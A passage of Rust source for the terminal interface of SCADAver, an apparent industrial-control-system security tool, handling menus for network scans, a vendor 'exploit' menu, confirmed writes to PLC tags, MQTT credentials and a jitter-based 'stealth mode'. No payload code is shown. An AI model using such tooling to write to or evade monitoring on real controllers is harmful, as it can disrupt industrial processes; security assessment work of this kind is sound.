        Line::from(Span::styled(
            "  g / G    Top / bottom (in zoom)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  Cyan ══  Job start/end separator",
            s.fg(Color::Cyan),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Global",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  ?        Toggle this help",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  ESC      Back / cancel / clear filter",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  Q        Quit (confirm prompt)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled("  C-c      Force quit", s.fg(Color::White))),
        Line::from(""),
        Line::from(Span::styled(
            "  DB: ~/.config/scadaver/devices.db",
            s.fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Help \u{2014} SCADAver ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn handle_references(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc | KeyCode::Char('b' | 'B') => app.mode = Mode::Normal,
        KeyCode::Char('j') | KeyCode::Down => {
            app.references_scroll = app.references_scroll.saturating_add(1);
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.references_scroll = app.references_scroll.saturating_sub(1);
        }
        KeyCode::PageDown => {
            app.references_scroll = app.references_scroll.saturating_add(10);
        }
        KeyCode::PageUp => {
            app.references_scroll = app.references_scroll.saturating_sub(10);
        }
        _ => {}
    }
}

fn references_vendor_refs(app: &App) -> Vec<&'static casket::references::Reference> {
    use casket::references;
    let Some(dev) = app.selected_device() else {
        return Vec::new();
    };
    let vendor = dev.vendor.as_str();
    if vendor == "multi" {
        let protocols: Vec<String> = dev
            .fields
            .get("protocols")
            .and_then(|v| v.as_array())
            .map(|arr| {
                arr.iter()
                    .filter_map(|v| v.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        references::for_multi(&protocols)
    } else {
        references::for_vendor(vendor)
    }
}

fn draw_references(frame: &mut Frame, area: Rect, app: &mut App) {
    use casket::references::Reference;

    let popup = centered_rect(72, 82, area);
    frame.render_widget(Clear, popup);

    let s = Style::default();
    let refs: Vec<&Reference> = references_vendor_refs(app);

    let vendor_label = app.selected_device().map_or_else(
        || "\u{2014}".into(),
        |d| {
            if d.vendor == "multi" {
                d.fields
                    .get("protocols")
                    .and_then(|v| v.as_array())
                    .map_or_else(
                        || "multi".into(),
                        |arr| {
                            arr.iter()
                                .filter_map(|v| v.as_str())
                                .collect::<Vec<_>>()
                                .join(" + ")
                        },
                    )
            } else {
                d.vendor.clone()
            }
        },
    );

    let title = format!(" Research References \u{2014} {vendor_label} ");

    let inner_width = popup.width.saturating_sub(4) as usize;

    let mut lines: Vec<Line> = vec![Line::from("")];

    if refs.is_empty() {
        lines.push(Line::from(Span::styled(
            "  No references found for this vendor.",
            s.fg(Color::DarkGray),
        )));
        lines.push(Line::from(Span::styled(
            "  Select a device first, or try 'scadaver db refs <vendor>' in the CLI.",
            s.fg(Color::DarkGray),
        )));
    } else {
        lines.push(Line::from(Span::styled(
            format!(
                "  {} references  (source: neutrinoguy/awesome-ics-writeups)",
                refs.len()
            ),
            s.fg(Color::DarkGray),
        )));
        lines.push(Line::from(""));

        for r in &refs {
            lines.push(Line::from(vec![
                Span::styled(
                    format!("  [{source}]  ", source = r.source),
                    s.fg(Color::Cyan),
                ),
                Span::styled(
                    r.title.clone(),
                    s.fg(Color::White).add_modifier(Modifier::BOLD),
                ),
            ]));
            let url_display = if r.url.chars().count() > inner_width {
                let truncate_at = r
                    .url
                    .char_indices()
                    .nth(inner_width.saturating_sub(2))
                    .map_or(r.url.len(), |(i, _)| i);
                format!("  {}…", &r.url[..truncate_at])
            } else {
                format!("  {}", r.url)
            };
            lines.push(Line::from(Span::styled(url_display, s.fg(Color::DarkGray))));
            lines.push(Line::from(""));
        }
    }

    // Clamp scroll
    let max_scroll = lines.len().saturating_sub(1);
    if app.references_scroll > max_scroll {
        app.references_scroll = max_scroll;
    }

    let block = Block::default()
        .title(title)
        .borders(Borders::ALL)
        .border_style(s.fg(Color::Rgb(255, 140, 0)));

    frame.render_widget(
        Paragraph::new(lines)
            .block(block)
            .scroll((u16::try_from(app.references_scroll).unwrap_or(u16::MAX), 0))
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_quit_confirm(frame: &mut Frame, area: Rect) {
    let popup = centered_rect(38, 22, area);
    frame.render_widget(Clear, popup);
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            "  Quit SCADAver?",
            Style::default()
                .fg(Color::White)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            "  [Q] Confirm quit",
            Style::default().fg(Color::Red),
        )),
        Line::from(Span::styled(
            "  [ESC] Cancel",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Confirm Exit ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Red)),
        ),
        popup,
    );
}

fn centered_rect(pct_x: u16, pct_y: u16, area: Rect) -> Rect {
    let margin_v = (100 - pct_y) / 2;
    let margin_h = (100 - pct_x) / 2;
    let vert = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Percentage(margin_v),
            Constraint::Percentage(pct_y),
            Constraint::Percentage(margin_v),
        ])
        .split(area);
    Layout::default()
        .direction(Direction::Horizontal)
        .constraints([
            Constraint::Percentage(margin_h),
            Constraint::Percentage(pct_x),
            Constraint::Percentage(margin_h),
        ])
        .split(vert[1])[1]
}

// ─── Event handlers ──────────────────────────────────────────────────────────

/// Returns true if the app should quit.
fn handle_key(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
    let mode = app.mode.clone();
    match mode {
        Mode::Normal => handle_normal(app, db, code, mods),
        Mode::IpInput => {
            handle_ip_input(app, code);
            false
        }
        Mode::ScanMenu => {
            handle_scan_menu(app, code);
            false
        }
        Mode::ExploitMenu => {
            handle_exploit_menu(app, code);
            false
        }
        Mode::ExploitInput => {
            handle_exploit_input(app, code);
            false
        }
        Mode::ExploitConfirm => {
            handle_exploit_confirm(app, code);
            false
        }
        Mode::VendorPicker => {
            handle_vendor_picker(app, code);
            false
        }
        Mode::Search => {
            handle_search(app, code);
            false
        }
        Mode::Help => {
            app.mode = Mode::Normal;
            false
        }
        Mode::References => {
            handle_references(app, code);
            false
        }
        Mode::OutputZoom => {
            handle_output_zoom(app, code, mods);
            false
        }
        Mode::CacheRescanPrompt => {
            handle_cache_rescan_prompt(app, code);
            false
        }
        Mode::MqttMonitor => {
            handle_mqtt_monitor(app, code);
            false
        }
        Mode::MqttClientIdInput => {
            handle_mqtt_client_id_input(app, code);
            false
        }
        Mode::MqttCredInput => {
            handle_mqtt_cred_input(app, code);
            false
        }
        Mode::ImportInput => {
            handle_import_input(app, db, code);
            false
        }
        Mode::WordlistInput => {
            handle_wordlist_input(app, code);
            false
        }
    }
}

fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
    match code {
        // Filter-input intercepts: handled before any other key when filter is active.
        KeyCode::Esc if app.output_filter_active => {
            app.output_filter_active = false;
            app.output_filter.clear();
        }
        KeyCode::Enter if app.output_filter_active => {
            app.output_filter_active = false;
        }
        KeyCode::Backspace if app.output_filter_active => {
            app.output_filter.pop();
            if app.output_filter.is_empty() {
                app.output_filter_active = false;
            }
        }
        KeyCode::Char(c) if app.output_filter_active => {
            app.output_filter.push(c);
        }
        KeyCode::Esc | KeyCode::Char('o' | 'O') => app.exit_zoom(),
        KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => app.exit_zoom(),
        KeyCode::Char('c' | 'C') => {
            if let Some(backup) = app.output_line_backup.take() {
                app.output_lines = backup;
                app.output_scroll = 0;
                app.output_leaf_cursor = None;
                app.tag_leaf_line_indices =
                    build_leaf_line_indices(&app.output_lines, &app.tag_leaves);
                if let Some(&(first_line, _)) = app.tag_leaf_line_indices.first() {
                    app.scroll_to_output_line(first_line);
                }
            } else {
                if !app.output_lines.is_empty() {
                    app.output_line_backup = Some(app.output_lines.clone());
                }
                app.output_lines.clear();
                app.output_has_tag_content = false;
                app.output_scroll = 0;
                app.output_leaf_cursor = None;
            }
        }
        KeyCode::Char('i' | 'I') => {
            if app.output_from_cache && app.scan_timestamp.is_none() {
                // Overview (DB snapshot) — trigger a live scan to expand structs.
                fire_overview_list_tags(app);
            } else if !app.tag_leaves.is_empty() {
                app.tag_leaf_line_indices =
                    build_leaf_line_indices(&app.output_lines, &app.tag_leaves);
                if !app.tag_leaf_line_indices.is_empty() {
                    app.output_leaf_cursor = Some(0);
                    if let Some(&(first_line, _)) = app.tag_leaf_line_indices.first() {
                        app.scroll_to_output_line(first_line);
                    }
                    if let Some(cached) = app.per_device_output.get_mut(&app.tag_write_ip) {
                        cached
                            .tag_leaf_line_indices
                            .clone_from(&app.tag_leaf_line_indices);
                        cached.output_leaf_cursor = app.output_leaf_cursor;
                    }
                }
            }
        }
        KeyCode::Char('j') | KeyCode::Down => {
            if app.output_leaf_cursor.is_some() {
                app.leaf_cursor_next();
            } else {
                app.scroll_output_down(1);
            }
        }
        KeyCode::Char('k') | KeyCode::Up => {
            if app.output_leaf_cursor.is_some() {
                app.leaf_cursor_prev();
            } else {
                app.scroll_output_up(1);
            }
        }
        KeyCode::Char('w' | 'W') => {
            if let Some(n) = app.output_leaf_cursor {
                let leaf_idx = app.tag_leaf_line_indices.get(n).map(|&(_, li)| li);
                if let Some((path, writable)) =
                    leaf_idx.and_then(|i| app.tag_leaves.get(i)).cloned()
                {
                    if writable {
                        // Struct member leaves from DB have no CIP type word — a live
                        // rescan is required before we can write safely.
                        if path.contains('.')
                            && app.output_from_cache
                            && app.scan_timestamp.is_none()
                        {
                            app.output_lines.push(
                                "[!] Struct member writes need a live rescan first — press [I]"
                                    .to_string(),
                            );
                        } else if app.output_from_cache {
                            // Tags are from a previous scan — ask before writing.
                            app.pending_tag_write = Some((path, true));
                            app.mode = Mode::CacheRescanPrompt;
                        } else {
                            let label = format!("Write Tag: {path}");
                            let write_idx = if app.tag_write_vendor.contains("beckhoff") {
                                8
                            } else {
                                3
                            };
                            app.pending_exploit = Some(PendingExploit {
                                vendor: app.tag_write_vendor.clone(),
                                idx: write_idx,
                                ip: app.tag_write_ip.clone(),
                                port: app.tag_write_port,
                                input: String::new(),
                                label,
                            });
                            app.input_buf = format!("{path}=");
                            app.tag_write_pending = true;
                            app.mode = Mode::ExploitInput;
                        }
                    } else {
                        app.output_lines
                            .push("[!] This leaf is read-only".to_string());
                    }
                }
            }
        }
        KeyCode::PageDown => app.scroll_output_down(20),
        KeyCode::PageUp => app.scroll_output_up(20),
        // g = go to top (oldest), G = go to bottom (newest / auto-scroll)
        KeyCode::Char('G') | KeyCode::End => app.output_scroll = 0,
        KeyCode::Char('g') | KeyCode::Home => {
            app.output_scroll = app.output_lines.len().saturating_sub(1);
        }
        KeyCode::Char('/') => {
            app.output_filter.clear();
            app.output_filter_active = true;
        }
        _ => {}
    }
}

fn handle_normal(app: &mut App, db: &Database, code: KeyCode, mods: KeyModifiers) -> bool {
    match code {
        KeyCode::Char('q' | 'Q') => {
            if app.quit_confirm {
                return true;
            }
            app.quit_confirm = true;
            return false;
        }
        KeyCode::Char('c') if mods.contains(KeyModifiers::CONTROL) => return true,
        KeyCode::Esc if app.quit_confirm => {
            app.quit_confirm = false;
        }
        KeyCode::PageUp => {
            app.scroll_output_up(10);
        }
        KeyCode::PageDown => {
            app.scroll_output_down(10);
        }
        KeyCode::Char('o' | 'O') => app.enter_zoom(),
        KeyCode::Char('i' | 'I') => {
            // Open OutputZoom and activate leaf cursor immediately.
            if app.output_from_cache && app.scan_timestamp.is_none() {
                // Overview (DB snapshot) — fire a live scan to expand structs, then zoom.
                fire_overview_list_tags(app);
            } else if !app.tag_leaves.is_empty() {
                app.tag_leaf_line_indices =
                    build_leaf_line_indices(&app.output_lines, &app.tag_leaves);
                if !app.tag_leaf_line_indices.is_empty() {
                    app.output_leaf_cursor = Some(0);
                    if let Some(&(first_line, _)) = app.tag_leaf_line_indices.first() {
                        app.scroll_to_output_line(first_line);
                    }
                    if let Some(cached) = app.per_device_output.get_mut(&app.tag_write_ip) {
                        cached
                            .tag_leaf_line_indices
                            .clone_from(&app.tag_leaf_line_indices);
                        cached.output_leaf_cursor = app.output_leaf_cursor;
                    }
                }
            }
            app.enter_zoom();
        }
        KeyCode::Char('j') | KeyCode::Down => app.select_next(),
        KeyCode::Char('k') | KeyCode::Up => app.select_prev(),
        KeyCode::Char('a' | 'A') => {
            app.input_buf.clear();
            app.output_lines.clear();
            app.output_has_tag_content = false;
            app.output_scroll = 0;
            app.mode = Mode::IpInput;
        }
        KeyCode::Char('s' | 'S') => {
            app.scan_menu_sel = 0;
            app.mode = Mode::ScanMenu;
        }
        KeyCode::Char('e' | 'E') => {
            app.open_exploit_menu();
            maybe_auto_load_tags(app);
        }
        KeyCode::Char('r' | 'R') => {
            if let Some(ip) = app.selected_device_ip() {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_has_tag_content = false;
                    app.output_scroll = 0;
                }
                app.output_lines.push(format!("══ Rescan @ {ip} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Rescanning {ip}..."));
                let tx = app.scan_tx.clone();
                let port = app.device_port(0);
                let mut target = TargetScan::new(ip);
                if port != 0 {
                    target.port = Some(port);
                }
                target.transport = selected_transport(app);
                target.vendor = app.selected_device().map(|d| d.vendor.to_ascii_lowercase());
                spawn_ip_scan(target, tx);
            }
        }
        KeyCode::Char('c' | 'C') if !mods.contains(KeyModifiers::CONTROL) => {
            app.output_lines.clear();
            app.output_has_tag_content = false;
            app.output_scroll = 0;
            app.output_leaf_cursor = None;
            // tag_leaves and tag_leaf_line_indices are preserved so J can re-activate cursor
        }
        KeyCode::Char('x' | 'X') => match export_to_file(app) {
            Ok(path) => {
                app.output_lines.push(format!("[*] Exported to {path}"));
                app.output_scroll = 0;
            }
            Err(e) => app.output_lines.push(format!("[!] Export failed: {e:#}")),
        },
        KeyCode::Char('f' | 'F') => {
            app.export_format = match app.export_format {
                ExportFormat::Json => ExportFormat::Csv,
                ExportFormat::Csv => ExportFormat::Json,
            };
            let fmt = match app.export_format {
                ExportFormat::Json => "JSON",
                ExportFormat::Csv => "CSV",
            };
            app.output_lines
                .push(format!("[*] Export format: {fmt} (press X to export)"));
        }
        KeyCode::Char('d' | 'D') => {
            if let Some(dev) = app.selected_device() {
                let (id, ip) = (dev.id, dev.ip.clone());
                if db.delete_device(id).is_ok() {
                    app.log(format!("[!] Deleted {ip}"));
                    app.reload(db);
                }
            }
        }
        KeyCode::Char('/') => {
            app.input_buf.clear();
            app.mode = Mode::Search;
        }
        KeyCode::Char('b' | 'B') => {
            app.references_scroll = 0;
            app.mode = Mode::References;
        }
        KeyCode::Char('w' | 'W') => {
            app.input_buf = app.wordlist_path.clone().unwrap_or_default();
            app.mode = Mode::WordlistInput;
        }
        KeyCode::Char('m' | 'M') => {
            let ip = app
                .selected_device_ip()
                .unwrap_or_else(|| "127.0.0.1".to_string());
            let port = app.field_port(&["port"], 1883);
            app.enter_mqtt_monitor(&ip, port);
        }
        KeyCode::Char('u' | 'U') => {
            app.input_buf.clear();
            app.mode = Mode::MqttCredInput;
        }
        KeyCode::Char('t') => {
            app.mqtt_conn.tls = !app.mqtt_conn.tls;
            let state = if app.mqtt_conn.tls { "ON" } else { "OFF" };
            app.output_lines
                .push(format!("[*] MQTT TLS: {state} (applies on next connect)"));
            app.output_scroll = 0;
        }
        KeyCode::Char('v') => {
            app.mqtt_conn.version = match app.mqtt_conn.version {
                MqttVersion::V311 => MqttVersion::V5,
                MqttVersion::V5 => MqttVersion::V311,
            };
        }
        KeyCode::Char('z' | 'Z') => {
            app.stealth = !app.stealth;
            casket::core::autodetect::set_stealth(app.stealth);
            let state = if app.stealth { "ON" } else { "OFF" };
            app.log(format!(
                "[!] Stealth mode {state}: probes will {}",
                if app.stealth {
                    "shuffle order and add jitter"
                } else {
                    "run at full speed"
                }
            ));
        }
        KeyCode::Char('?') => app.mode = Mode::Help,
        KeyCode::Esc => {
            if app.quit_confirm {
                app.quit_confirm = false;
            } else {
                app.filter.clear();
                app.rebuild_filtered();
            }
        }
        _ => {}
    }
    false
}

fn handle_ip_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.mode = Mode::Normal;
            app.input_buf.clear();
        }
        KeyCode::Enter => {
            let raw = app.input_buf.trim().to_string();
            if raw.contains('/') {
                match raw.parse::<ipnetwork::IpNetwork>() {
                    Ok(net) => {
                        const MAX_HOSTS: u128 = 1024;
                        let size: u128 = match net.size() {
                            ipnetwork::NetworkSize::V4(n) => u128::from(n),
                            ipnetwork::NetworkSize::V6(n) => n,
                        };
                        if size > MAX_HOSTS {
                            app.output_lines.push(format!(
                                "[-] {net} has {size} hosts: TUI limit is {MAX_HOSTS}. Use /22 or smaller."
                            ));
                        } else {
                            if app.active_jobs == 0 {
                                app.output_lines.clear();
                                app.output_scroll = 0;
                            }
                            let hosts: Vec<std::net::IpAddr> = net.iter().collect();
                            app.output_lines.push(format!(
                                "[*] Scanning {} hosts in {net}\u{2026}",
                                hosts.len()
                            ));
                            for host in hosts {
                                app.active_jobs += 1;
                                spawn_ip_scan(
                                    TargetScan::new(host.to_string()),
                                    app.scan_tx.clone(),
                                );
                            }
                        }
                    }
                    Err(_) => {
                        app.output_lines.push(format!("[-] Invalid CIDR: {raw}"));
                    }
                }
                app.mode = Mode::Normal;
                app.input_buf.clear();
                return;
            }
            if let Some(target) = parse_target_scan(&raw) {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                let label = target.label();
                app.output_lines.push(format!("══ Probe @ {label} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Probing {label}..."));
                let tx = app.scan_tx.clone();
                spawn_ip_scan(target, tx);
                app.mode = Mode::Normal;
                app.input_buf.clear();
            } else if !raw.is_empty() {
                app.log(format!("[!] Invalid target: {raw}"));
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) if app.input_buf.len() < 50 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_scan_menu(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::Normal,
        KeyCode::Char('j') | KeyCode::Down => {
            app.scan_menu_sel = (app.scan_menu_sel + 1).min(SCAN_ITEMS.len() - 1);
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.scan_menu_sel = app.scan_menu_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let sel = app.scan_menu_sel;
            if sel == SCAN_BACK_IDX {
                app.mode = Mode::Normal;
            } else {
                if app.active_jobs == 0 {
                    app.output_lines.clear();
                    app.output_scroll = 0;
                }
                let label_str = SCAN_ITEMS[sel];
                app.output_lines.push(format!("══ Scan: {label_str} ══"));
                app.active_jobs += 1;
                app.log(format!("[*] Starting broadcast scan: {label_str}..."));
                let tx = app.scan_tx.clone();
                spawn_broadcast_scan(sel, tx);
                app.mode = Mode::Normal;
            }
        }
        _ => {}
    }
}

fn handle_exploit_menu(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::Normal,
        KeyCode::PageUp => {
            app.scroll_output_up(10);
        }
        KeyCode::PageDown => {
            app.scroll_output_down(10);
        }
        KeyCode::Char('o' | 'O') => app.enter_zoom(),
        KeyCode::Char('v' | 'V') => {
            let active = app.selected_vendor().unwrap_or_default();
            app.vendor_pick_sel = ALL_VENDORS
                .iter()
                .position(|&v| v == active.as_str())
                .unwrap_or(0);
            app.mode = Mode::VendorPicker;
        }
        KeyCode::Char('j') | KeyCode::Down => {
            app.exploit_sel = (app.exploit_sel + 1).min(app.exploit_defs.len().saturating_sub(1));
            app.exploit_list_state.select(Some(app.exploit_sel));
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.exploit_sel = app.exploit_sel.saturating_sub(1);
            app.exploit_list_state.select(Some(app.exploit_sel));
        }
        KeyCode::Enter => {
            let is_back = app
                .exploit_defs
                .get(app.exploit_sel)
                .is_some_and(|e| e.label.starts_with('\u{2190}'));
            if is_back {
                app.mode = Mode::Normal;
            } else {
                let Some(exploit) = app.exploit_defs.get(app.exploit_sel) else {
                    return;
                };
                let availability = action_availability(app, exploit);
                if !availability.enabled {
                    let reason = availability.reason.unwrap_or("action unavailable");
                    app.output_lines
                        .push(format!("[!] {} unavailable: {reason}", exploit.label));
                    app.output_lines.push(
                        "[*] Rescan with the right protocol/port or use [V] to view as another protocol."
                            .to_string(),
                    );
                    app.output_scroll = 0;
                    return;
                }
                if exploit.needs_input {
                    app.input_buf.clear();
                    app.mode = Mode::ExploitInput;
                } else {
                    fire_exploit(app, "");
                }
            }
        }
        _ => {}
    }
}

fn handle_exploit_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            if app.tag_write_pending {
                app.tag_write_pending = false;
                app.pending_exploit = None;
                app.input_buf.clear();
                app.mode = Mode::OutputZoom;
            } else {
                app.mode = Mode::ExploitMenu;
                app.input_buf.clear();
            }
        }
        KeyCode::Enter => {
            if app.tag_write_pending {
                if let Some(ref mut p) = app.pending_exploit {
                    p.input.clone_from(&app.input_buf);
                }
                app.tag_write_pending = false;
                app.input_buf.clear();
                app.mode = Mode::ExploitConfirm;
            } else {
                let input = app.input_buf.clone();
                fire_exploit(app, &input);
                if app.mode != Mode::ExploitConfirm {
                    app.mode = Mode::ExploitMenu;
                }
                app.input_buf.clear();
            }
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) if app.input_buf.len() < 128 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_exploit_confirm(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            if let Some(pending) = app.pending_exploit.take() {
                app.log(format!("[*] Cancelled: {}", pending.label));
            }
            app.input_buf.clear();
            app.mode = Mode::ExploitMenu;
        }
        KeyCode::Enter => {
            if app.input_buf.trim() == "YES" {
                if let Some(pending) = app.pending_exploit.take() {
                    execute_pending_exploit(app, &pending);
                }
                app.mode = Mode::ExploitMenu;
            } else {
                app.log("[!] Confirmation requires exactly YES");
            }
            app.input_buf.clear();
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
        }
        KeyCode::Char(c) if app.input_buf.len() < 8 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_search(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.filter.clear();
            app.rebuild_filtered();
            app.mode = Mode::Normal;
        }
        KeyCode::Enter => {
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
            app.mode = Mode::Normal;
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
        }
        KeyCode::Char(c) => {
            app.input_buf.push(c);
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
        }
        _ => {}
    }
}

fn handle_vendor_picker(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => app.mode = Mode::ExploitMenu,
        KeyCode::Char('j') | KeyCode::Down => {
            app.vendor_pick_sel = (app.vendor_pick_sel + 1).min(ALL_VENDORS.len() - 1);
        }
        KeyCode::Char('k') | KeyCode::Up => {
            app.vendor_pick_sel = app.vendor_pick_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let vendor = ALL_VENDORS[app.vendor_pick_sel].to_string();
            app.vendor_override = Some(vendor.clone());
            app.exploit_defs = exploits_for(&vendor);
            app.exploit_sel = 0;
            app.exploit_list_state = ListState::default();
            app.exploit_list_state.select(Some(0));
            app.mode = Mode::ExploitMenu;
        }
        _ => {}
    }
}

fn draw_vendor_picker(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(40, 75, area);
    frame.render_widget(Clear, popup);
    let items: Vec<ListItem> = ALL_VENDORS
        .iter()
        .map(|&v| {
            ListItem::new(Line::from(Span::styled(
                format!("  {}  ", v.to_uppercase()),
                Style::default().fg(vendor_color(v)),
            )))
        })
        .collect();
    let mut state = ListState::default();
    state.select(Some(app.vendor_pick_sel));
    let list = List::new(items)
        .block(
            Block::default()
                .title(" View as Protocol \u{2014} [J/K] Navigate  [ENTER] Apply  [ESC] Cancel ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Magenta)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::Rgb(50, 50, 70))
                .fg(Color::White)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");
    frame.render_stateful_widget(list, popup, &mut state);
}

/// Load saved tags and struct members from DB into the output panel.
/// Returns all navigable leaves: scalars from `device_tags` plus struct members
/// from `device_tag_members`, including grouped leaves for non-Rockwell vendors.
fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> Vec<(String, bool)> {
    use crate::db::{Database, MemberRecord};
    use casket::vendors::rockwell::driver;

    let Ok(db) = Database::open(&Database::default_path()) else {
        return Vec::new();
    };
    let mut tags = db
        .load_tags_for_protocol(ip, "rockwell")
        .unwrap_or_default();
    if tags.is_empty() {
        tags = db.load_tags(ip).unwrap_or_default();
    }
    let mut members = db
        .load_members_for_protocol(ip, "rockwell")
        .unwrap_or_default();
    if members.is_empty() {
        members = db.load_members(ip).unwrap_or_default();
    }
    if tags.is_empty() && members.is_empty() {
        return Vec::new();
    }

    // Group members by their parent prefix (part before the first '.').
    let mut member_map: std::collections::HashMap<&str, Vec<&MemberRecord>> =
        std::collections::HashMap::new();
    for m in &members {
        let prefix = m.path.find('.').map_or(m.path.as_str(), |i| &m.path[..i]);
        member_map.entry(prefix).or_default().push(m);
    }

    // Orphan prefixes: member prefixes with no matching top-level tag row.
    // These represent Beckhoff ADS program/GVL groups or other non-CIP vendors.
    let top_names: std::collections::HashSet<&str> = tags.iter().map(|t| t.name.as_str()).collect();
    let mut orphan_prefixes: Vec<&str> = member_map
        .keys()
        .copied()
        .filter(|p| !top_names.contains(p))
        .collect();
    orphan_prefixes.sort_unstable();

    let total_entries = tags.len() + orphan_prefixes.len();
    lines.push(format!(
        "══ Overview \u{2014} {total_entries} entries ({} member leaves) @ {ip} ══",
        members.len()
    ));
    let [hdr, sep] = tag_header();
    lines.push(hdr);
    lines.push(sep.clone());
    let mut leaves: Vec<(String, bool)> = Vec::new();

    // Render top-level tags, expanding STRUCT tags with their stored members.
    for t in &tags {
        let (base, dims) = driver::type_parts(u16::try_from(t.tag_type).unwrap_or(u16::MAX));
        lines.push(fmt_tag_row(
            t.instance_id,
            &t.name,
            &base,
            dims,
            "-",
            t.tag_type,
        ));
        if !base.starts_with("STRUCT") && dims == "-" {
            leaves.push((t.name.clone(), true));
        } else if base.starts_with("STRUCT") {
            if let Some(struct_members) = member_map.get(t.name.as_str()) {
                for m in struct_members {
                    let field = m
                        .path
                        .find('.')
                        .map_or(m.path.as_str(), |i| &m.path[i + 1..]);
                    let access = tag_access_class(&m.path);
                    lines.push(format!(
                        "           .{field:<40}  {:<14}  {:<4}  {:<18}  {:<9}  {access:<6}",
                        "(stored)", "-", "(cached)", "\u{2014}"
                    ));
                    leaves.push((m.path.clone(), m.writable));
                }
            }
        }
    }

    // Render orphan prefix groups (Beckhoff ADS / other vendors with no device_tags rows).
    // A synthetic INST row is used so build_leaf_line_indices sets current_struct correctly.
    for (idx, prefix) in orphan_prefixes.iter().enumerate() {
        if let Some(group) = member_map.get(prefix) {
            lines.push(fmt_tag_row(
                i64::try_from(idx).unwrap_or(i64::MAX),
                prefix,
                "GROUP",
                "-",
                "-",
                0,
            ));
            for m in group {
                let field = m
                    .path
                    .find('.')
                    .map_or(m.path.as_str(), |i| &m.path[i + 1..]);
                let access = tag_access_class(&m.path);
                lines.push(format!(
                    "           .{field:<40}  {:<14}  {:<4}  {:<18}  {:<9}  {access:<6}",
                    "(stored)", "-", "(cached)", "\u{2014}"
                ));
                leaves.push((m.path.clone(), m.writable));
            }
        }
    }

    lines.push(sep);
    lines.push(format!(
        "[+] {} top-level tag(s), {} member leaf/leaves loaded from database",
        tags.len() + orphan_prefixes.len(),
        members.len()
    ));
    leaves
}

/// Called when the exploit menu opens for Rockwell/enip with an empty output panel.
/// Loads saved DB tags and synthesizes navigable leaves — no background network access.
fn maybe_auto_load_tags(app: &mut App) {
    let Some(vendor) = app.selected_vendor() else {
        return;
    };
    let vendor_lc = vendor.to_lowercase();
    if !matches!(vendor_lc.as_str(), "rockwell" | "enip" | "beckhoff") {
        return;
    }
    if !app.output_lines.is_empty() {
        return;
    }
    let Some(ip) = app.selected_device_ip() else {
        return;
    };

    let leaves = load_db_tags_to_output(&ip, &mut app.output_lines);
    if !leaves.is_empty() {
        app.tag_leaves = leaves;
        app.tag_leaf_line_indices = build_leaf_line_indices(&app.output_lines, &app.tag_leaves);
        app.output_leaf_cursor = None;
        app.output_from_cache = true;
        app.scan_timestamp = None;
        app.tag_write_ip = ip;
        app.tag_write_port = if vendor_lc == "beckhoff" {
            48898
        } else {
            44818
        };
        app.tag_write_vendor = vendor;
    }
}

/// Fire "List Tags" directly (bypassing the confirmation dialog) when the user
/// presses I on Overview data to request struct expansion.
fn fire_overview_list_tags(app: &mut App) {
    let Some(vendor) = app.selected_vendor() else {
        return;
    };
    let vendor_lc = vendor.to_ascii_lowercase();
    if !matches!(vendor_lc.as_str(), "rockwell" | "enip" | "beckhoff") {
        return;
    }
    let exploit_label = if vendor_lc == "beckhoff" {
